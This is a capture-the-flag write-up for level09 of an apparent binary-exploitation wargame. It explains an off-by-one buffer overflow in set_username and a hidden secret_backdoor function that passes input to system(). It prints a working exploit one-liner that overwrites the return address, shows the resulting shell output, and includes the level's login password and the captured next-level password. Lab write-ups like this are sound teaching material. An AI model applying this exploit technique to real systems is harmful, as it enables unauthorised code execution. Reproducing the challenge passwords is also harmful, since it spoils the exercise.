# Level level09

## how to login

username: level09

password: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

## Goal

read `.pass` as user `level010`

## Actually doing something

Looking at the disassembled code, we see a small buffer overflow in the function `set_username`: 
```c
for ( i = 0; i <= 40 && s[i]; ++i )
    a1->usr[i] = s[i];
```

As well as a conveniently defined function `secret_backdoor`:
```c 
int secret_backdoor()
{
  char s[128]; 

  fgets(s, 128, stdin);
  return system(s);
}
```
Using the buffer overflow, we can modify the `len` member of the `data` struct which is then used in `set_msg()` to `strncpy` stuff into `data->msg`...

Meaning we can overwrite the return address which is after the struct on the stack, and replace it (or in this case only the least significant bytes) with the address of our convenient backdoor function.

```bash
level09@OverRide:~$ cat <(python -c 'print("\xcA" * 128 + "A" * 199 + "\x8c\x48")') - | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
sh
id
uid=1010(level09) gid=1010(level09) euid=1009(end) egid=100(users) groups=1009(end),100(users),1010(level09)
cat ~end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

Done! That was fun :D
